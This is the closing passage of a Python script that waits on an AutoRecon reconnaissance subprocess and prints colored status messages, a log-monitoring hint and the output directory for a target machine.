        autorecon_proc.wait()
        rc = autorecon_proc.returncode
        if rc == 0:
            print(f"{GREEN}[+] AutoRecon finished successfully.{RESET}")
        else:
            print(f"{RED}[!] AutoRecon exited with code {rc}. Check {machine_dir}/autorecon/autorecon.log{RESET}")
    elif autorecon_proc:
        print(f"\n{YELLOW}[~] AutoRecon still running in background (PID {autorecon_proc.pid}).")
        print(f"    Monitor: tail -f {machine_dir}/autorecon/autorecon.log{RESET}")

    print(f"\n{GREEN}{BOLD}[✓] Done. Output: {machine_dir}{RESET}\n")

if __name__ == "__main__":
    main()
